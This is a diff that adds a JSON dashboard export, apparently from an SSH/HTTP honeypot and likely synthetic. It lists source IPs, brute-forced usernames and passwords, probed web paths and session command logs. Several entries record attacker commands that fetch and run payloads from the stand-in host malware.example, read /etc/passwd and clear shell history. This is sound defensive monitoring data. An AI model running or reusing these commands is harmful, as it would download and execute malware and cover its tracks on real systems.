@@ -1,0 +1,791 @@
+{
+  "generated_at": "2026-05-17T08:30:25.258405+00:00",
+  "stats": {
+    "total_sessions": 220,
+    "unique_ips": 184,
+    "auth_attempts": 748,
+    "commands": 429,
+    "http_requests": 60,
+    "ssh_sessions": 160,
+    "http_sessions": 60
+  },
+  "timeline": [
+    {
+      "date": "2026-04-17",
+      "ssh": 5,
+      "http": 3
+    },
+    {
+      "date": "2026-04-18",
+      "ssh": 2,
+      "http": 2
+    },
+    {
+      "date": "2026-04-19",
+      "ssh": 6,
+      "http": 0
+    },
+    {
+      "date": "2026-04-20",
+      "ssh": 4,
+      "http": 2
+    },
+    {
+      "date": "2026-04-21",
+      "ssh": 3,
+      "http": 2
+    },
+    {
+      "date": "2026-04-22",
+      "ssh": 2,
+      "http": 2
+    },
+    {
+      "date": "2026-04-23",
+      "ssh": 2,
+      "http": 4
+    },
+    {
+      "date": "2026-04-24",
+      "ssh": 4,
+      "http": 2
+    },
+    {
+      "date": "2026-04-25",
+      "ssh": 3,
+      "http": 4
+    },
+    {
+      "date": "2026-04-26",
+      "ssh": 17,
+      "http": 4
+    },
+    {
+      "date": "2026-04-27",
+      "ssh": 16,
+      "http": 1
+    },
+    {
+      "date": "2026-04-28",
+      "ssh": 1,
+      "http": 2
+    },
+    {
+      "date": "2026-04-29",
+      "ssh": 4,
+      "http": 0
+    },
+    {
+      "date": "2026-04-30",
+      "ssh": 5,
+      "http": 1
+    },
+    {
+      "date": "2026-05-01",
+      "ssh": 3,
+      "http": 1
+    },
+    {
+      "date": "2026-05-02",
+      "ssh": 9,
+      "http": 1
+    },
+    {
+      "date": "2026-05-03",
+      "ssh": 9,
+      "http": 1
+    },
+    {
+      "date": "2026-05-04",
+      "ssh": 3,
+      "http": 1
+    },
+    {
+      "date": "2026-05-05",
+      "ssh": 4,
+      "http": 0
+    },
+    {
+      "date": "2026-05-06",
+      "ssh": 6,
+      "http": 4
+    },
+    {
+      "date": "2026-05-07",
+      "ssh": 4,
+      "http": 1
+    },
+    {
+      "date": "2026-05-08",
+      "ssh": 8,
+      "http": 2
+    },
+    {
+      "date": "2026-05-09",
+      "ssh": 5,
+      "http": 1
+    },
+    {
+      "date": "2026-05-10",
+      "ssh": 5,
+      "http": 3
+    },
+    {
+      "date": "2026-05-11",
+      "ssh": 4,
+      "http": 4
+    },
+    {
+      "date": "2026-05-12",
+      "ssh": 1,
+      "http": 3
+    },
+    {
+      "date": "2026-05-13",
+      "ssh": 16,
+      "http": 1
+    },
+    {
+      "date": "2026-05-14",
+      "ssh": 1,
+      "http": 4
+    },
+    {
+      "date": "2026-05-15",
+      "ssh": 3,
+      "http": 4
+    },
+    {
+      "date": "2026-05-16",
+      "ssh": 5,
+      "http": 0
+    }
+  ],
+  "top_ips": [
+    {
+      "ip": "183.136.216.230",
+      "country": "China",
+      "country_code": "CN",
+      "attempts": 71,
+      "sessions": 13
+    },
+    {
+      "ip": "88.198.118.234",
+      "country": "Germany",
+      "country_code": "DE",
+      "attempts": 66,
+      "sessions": 13
+    },
+    {
+      "ip": "183.136.186.196",
+      "country": "China",
+      "country_code": "CN",
+      "attempts": 62,
+      "sessions": 13
+    },
+    {
+      "ip": "103.28.177.83",
+      "country": "Indonesia",
+      "country_code": "ID",
+      "attempts": 8,
+      "sessions": 1
+    },
+    {
+      "ip": "104.131.98.201",
+      "country": "United States",
+      "country_code": "US",
+      "attempts": 8,
+      "sessions": 1
+    },
+    {
+      "ip": "14.177.78.11",
+      "country": "Vietnam",
+      "country_code": "VN",
+      "attempts": 8,
+      "sessions": 1
+    },
+    {
+      "ip": "146.0.249.83",
+      "country": "Netherlands",
+      "country_code": "NL",
+      "attempts": 8,
+      "sessions": 1
+    },
+    {
+      "ip": "159.89.4.172",
+      "country": "United States",
+      "country_code": "US",
+      "attempts": 8,
+      "sessions": 1
+    },
+    {
+      "ip": "182.74.59.182",
+      "country": "India",
+      "country_code": "IN",
+      "attempts": 8,
+      "sessions": 1
+    },
+    {
+      "ip": "192.241.237.43",
+      "country": "United States",
+      "country_code": "US",
+      "attempts": 8,
+      "sessions": 1
+    },
+    {
+      "ip": "222.112.252.223",
+      "country": "South Korea",
+      "country_code": "KR",
+      "attempts": 8,
+      "sessions": 1
+    },
+    {
+      "ip": "61.177.111.225",
+      "country": "China",
+      "country_code": "CN",
+      "attempts": 8,
+      "sessions": 1
+    }
+  ],
+  "top_usernames": [
+    {
+      "value": "admin",
+      "count": 86
+    },
+    {
+      "value": "ubuntu",
+      "count": 85
+    },
+    {
+      "value": "user",
+      "count": 81
+    },
+    {
+      "value": "root",
+      "count": 78
+    },
+    {
+      "value": "oracle",
+      "count": 75
+    },
+    {
+      "value": "postgres",
+      "count": 74
+    },
+    {
+      "value": "test",
+      "count": 72
+    },
+    {
+      "value": "git",
+      "count": 70
+    },
+    {
+      "value": "pi",
+      "count": 67
+    },
+    {
+      "value": "ftpuser",
+      "count": 60
+    }
+  ],
+  "top_passwords": [
+    {
+      "value": "qwerty",
+      "count": 82
+    },
+    {
+      "value": "pass",
+      "count": 81
+    },
+    {
+      "value": "password",
+      "count": 81
+    },
+    {
+      "value": "admin",
+      "count": 78
+    },
+    {
+      "value": "123123",
+      "count": 77
+    },
+    {
+      "value": "root",
+      "count": 72
+    },
+    {
+      "value": "123456",
+      "count": 71
+    },
+    {
+      "value": "12345678",
+      "count": 71
+    },
+    {
+      "value": "letmein",
+      "count": 68
+    },
+    {
+      "value": "1q2w3e4r",
+      "count": 67
+    }
+  ],
+  "top_commands": [
+    {
+      "value": "history -c",
+      "count": 34
+    },
+    {
+      "value": "free -m",
+      "count": 33
+    },
+    {
+      "value": "df -h",
+      "count": 30
+    },
+    {
+      "value": "uname -a",
+      "count": 29
+    },
+    {
+      "value": "wget http://malware.example/x.sh",
+      "count": 27
+    },
+    {
+      "value": "cat /etc/passwd",
+      "count": 26
+    },
+    {
+      "value": "ifconfig",
+      "count": 24
+    },
+    {
+      "value": "chmod +x x.sh",
+      "count": 23
+    },
+    {
+      "value": "curl -O http://malware.example/bot",
+      "count": 23
+    },
+    {
+      "value": "ps aux",
+      "count": 23
+    },
+    {
+      "value": "cat /proc/cpuinfo",
+      "count": 21
+    },
+    {
+      "value": "crontab -l",
+      "count": 21
+    }
+  ],
+  "http_paths": [
+    {
+      "value": "/wp-login.php",
+      "count": 11
+    },
+    {
+      "value": "/login",
+      "count": 9
+    },
+    {
+      "value": "/phpmyadmin/index.php",
+      "count": 6
+    },
+    {
+      "value": "/admin",
+      "count": 6
+    },
+    {
+      "value": "/api",
+      "count": 5
+    },
+    {
+      "value": "/",
+      "count": 5
+    },
+    {
+      "value": "/wp-admin",
+      "count": 4
+    },
+    {
+      "value": "/cgi-bin/",
+      "count": 4
+    },
+    {
+      "value": "/.git/config",
+      "count": 4
+    },
+    {
+      "value": "/.env",
+      "count": 4
+    },
+    {
+      "value": "/phpmyadmin",
+      "count": 2
+    }
+  ],
+  "map_points": [
+    {
+      "lat": 35.86,
+      "lon": 104.2,
+      "country": "China",
+      "count": 77
+    },
+    {
+      "lat": 37.09,
+      "lon": -95.71,
+      "country": "United States",
+      "count": 31
+    },
+    {
+      "lat": 61.52,
+      "lon": 105.32,
+      "country": "Russia",
+      "count": 21
+    },
+    {
+      "lat": 20.59,
+      "lon": 78.96,
+      "country": "India",
+      "count": 20
+    },
+    {
+      "lat": 51.17,
+      "lon": 10.45,
+      "country": "Germany",
+      "count": 19
+    },
+    {
+      "lat": 14.06,
+      "lon": 108.28,
+      "country": "Vietnam",
+      "count": 16
+    },
+    {
+      "lat": 35.91,
+      "lon": 127.77,
+      "country": "South Korea",
+      "count": 13
+    },
+    {
+      "lat": -14.24,
+      "lon": -51.93,
+      "country": "Brazil",
+      "count": 12
+    },
+    {
+      "lat": 52.13,
+      "lon": 5.29,
+      "country": "Netherlands",
+      "count": 7
+    },
+    {
+      "lat": -0.79,
+      "lon": 113.92,
+      "country": "Indonesia",
+      "count": 4
+    }
+  ],
+  "recent_sessions": [
+    {
+      "id": 40,
+      "protocol": "ssh",
+      "src_ip": "14.139.115.168",
+      "country": "India",
+      "started_at": "2026-05-16T19:03:24+00:00",
+      "auth_attempts": 4,
+      "commands": []
+    },
+    {
+      "id": 77,
+      "protocol": "ssh",
+      "src_ip": "117.239.122.24",
+      "country": "India",
+      "started_at": "2026-05-16T13:32:35+00:00",
+      "auth_attempts": 3,
+      "commands": [
+        "history -c",
+        "ps aux",
+        "cat /proc/cpuinfo",
+        "w",
+        "ps aux",
+        "crontab -l"
+      ]
+    },
+    {
+      "id": 148,
+      "protocol": "ssh",
+      "src_ip": "171.244.226.70",
+      "country": "Vietnam",
+      "started_at": "2026-05-16T12:46:07+00:00",
+      "auth_attempts": 3,
+      "commands": [
+        "./x.sh",
+        "df -h",
+        "cat /etc/passwd",
+        "cat /etc/os-release",
+        "curl -O http://malware.example/bot",
+        "crontab -l",
+        "cat /etc/passwd",
+        "free -m"
+      ]
+    },
+    {
+      "id": 56,
+      "protocol": "ssh",
+      "src_ip": "61.177.188.17",
+      "country": "China",
+      "started_at": "2026-05-16T08:47:06+00:00",
+      "auth_attempts": 8,
+      "commands": []
+    },
+    {
+      "id": 121,
+      "protocol": "ssh",
+      "src_ip": "5.188.187.73",
+      "country": "Russia",
+      "started_at": "2026-05-16T08:34:08+00:00",
+      "auth_attempts": 3,
+      "commands": [
+        "ps aux",
+        "history -c",
+        "ps aux",
+        "chmod +x x.sh",
+        "ifconfig"
+      ]
+    },
+    {
+      "id": 104,
+      "protocol": "ssh",
+      "src_ip": "61.177.72.60",
+      "country": "China",
+      "started_at": "2026-05-15T16:17:34+00:00",
+      "auth_attempts": 6,
+      "commands": []
+    },
+    {
+      "id": 89,
+      "protocol": "ssh",
+      "src_ip": "185.220.43.129",
+      "country": "Russia",
+      "started_at": "2026-05-15T12:40:14+00:00",
+      "auth_attempts": 4,
+      "commands": []
+    },
+    {
+      "id": 58,
+      "protocol": "ssh",
+      "src_ip": "222.186.1.226",
+      "country": "China",
+      "started_at": "2026-05-15T10:43:46+00:00",
+      "auth_attempts": 4,
+      "commands": [
+        "cat /etc/passwd",
+        "cat /proc/cpuinfo",
+        "wget http://malware.example/x.sh",
+        "uname -a",
+        "./x.sh",
+        "chmod +x x.sh",
+        "free -m"
+      ]
+    },
+    {
+      "id": 84,
+      "protocol": "http",
+      "src_ip": "200.150.202.91",
+      "country": "Brazil",
+      "started_at": "2026-05-15T08:39:38+00:00",
+      "auth_attempts": 0,
+      "commands": []
+    },
+    {
+      "id": 143,
+      "protocol": "http",
+      "src_ip": "183.136.121.127",
+      "country": "China",
+      "started_at": "2026-05-15T07:22:58+00:00",
+      "auth_attempts": 0,
+      "commands": []
+    },
+    {
+      "id": 137,
+      "protocol": "http",
+      "src_ip": "121.139.61.9",
+      "country": "South Korea",
+      "started_at": "2026-05-15T06:15:12+00:00",
+      "auth_attempts": 0,
+      "commands": []
+    },
+    {
+      "id": 52,
+      "protocol": "http",
+      "src_ip": "61.177.22.66",
+      "country": "China",
+      "started_at": "2026-05-15T05:50:30+00:00",
+      "auth_attempts": 0,
+      "commands": []
+    },
+    {
+      "id": 113,
+      "protocol": "http",
+      "src_ip": "185.220.62.96",
+      "country": "Russia",
+      "started_at": "2026-05-14T15:50:48+00:00",
+      "auth_attempts": 0,
+      "commands": []
+    },
+    {
+      "id": 85,
+      "protocol": "http",
+      "src_ip": "88.198.194.23",
+      "country": "Germany",
+      "started_at": "2026-05-14T15:43:51+00:00",
+      "auth_attempts": 0,
+      "commands": []
+    },
+    {
+      "id": 68,
+      "protocol": "http",
+      "src_ip": "182.74.237.190",
+      "country": "India",
+      "started_at": "2026-05-14T12:29:34+00:00",
+      "auth_attempts": 0,
+      "commands": []
+    },
+    {
+      "id": 9,
+      "protocol": "http",
+      "src_ip": "5.9.194.37",
+      "country": "Germany",
+      "started_at": "2026-05-14T10:58:19+00:00",
+      "auth_attempts": 0,
+      "commands": []
+    },
+    {
+      "id": 131,
+      "protocol": "ssh",
+      "src_ip": "45.79.153.93",
+      "country": "United States",
+      "started_at": "2026-05-14T08:45:31+00:00",
+      "auth_attempts": 2,
+      "commands": []
+    },
+    {
+      "id": 17,
+      "protocol": "ssh",
+      "src_ip": "121.139.143.124",
+      "country": "South Korea",
+      "started_at": "2026-05-13T14:30:17+00:00",
+      "auth_attempts": 3,
+      "commands": [
+        "id",
+        "history -c",
+        "cat /etc/os-release",
+        "curl -O http://malware.example/bot",
+        "id"
+      ]
+    },
+    {
+      "id": 45,
+      "protocol": "http",
+      "src_ip": "200.150.151.170",
+      "country": "Brazil",
+      "started_at": "2026-05-13T14:21:08+00:00",
+      "auth_attempts": 0,
+      "commands": []
+    },
+    {
+      "id": 219,
+      "protocol": "ssh",
+      "src_ip": "183.136.186.196",
+      "country": "China",
+      "started_at": "2026-05-13T13:50:00+00:00",
+      "auth_attempts": 7,
+      "commands": [
+        "free -m",
+        "free -m",
+        "curl -O http://malware.example/bot",
+        "ifconfig",
+        "df -h",
+        "free -m",
+        "chmod +x x.sh"
+      ]
+    },
+    {
+      "id": 218,
+      "protocol": "ssh",
+      "src_ip": "183.136.186.196",
+      "country": "China",
+      "started_at": "2026-05-13T13:48:00+00:00",
+      "auth_attempts": 5,
+      "commands": []
+    },
+    {
+      "id": 217,
+      "protocol": "ssh",
+      "src_ip": "183.136.186.196",
+      "country": "China",
+      "started_at": "2026-05-13T13:47:00+00:00",
+      "auth_attempts": 5,
+      "commands": [
+        "ip a",
+        "cat /etc/passwd",
+        "ifconfig",
+        "df -h",
+        "history -c",
+        "free -m",
+        "ip a",
+        "whoami",
+        "history -c"
+      ]
+    },
+    {
+      "id": 216,
+      "protocol": "ssh",
+      "src_ip": "183.136.186.196",
+      "country": "China",
+      "started_at": "2026-05-13T13:45:00+00:00",
+      "auth_attempts": 3,
+      "commands": [
+        "ifconfig",
+        "ps aux",
+        "uname -a",
+        "crontab -l",
+        "wget http://malware.example/x.sh",
+        "id",
+        "chmod +x x.sh",
+        "w",
+        "wget http://malware.example/x.sh"
+      ]
+    },
+    {
+      "id": 215,
+      "protocol": "ssh",
+      "src_ip": "183.136.186.196",
+      "country": "China",
+      "started_at": "2026-05-13T13:36:00+00:00",
+      "auth_attempts": 6,
+      "commands": [
+        "df -h",
+        "ifconfig",
+        "cat /etc/passwd"
+      ]
+    },
+    {
+      "id": 214,
+      "protocol": "ssh",
+      "src_ip": "183.136.186.196",
+      "country": "China",
+      "started_at": "2026-05-13T13:33:00+00:00",
+      "auth_attempts": 4,
+      "commands": [
+        "id",
+        "uname -a",
+        "free -m"
+      ]
+    }
+  ]
+}
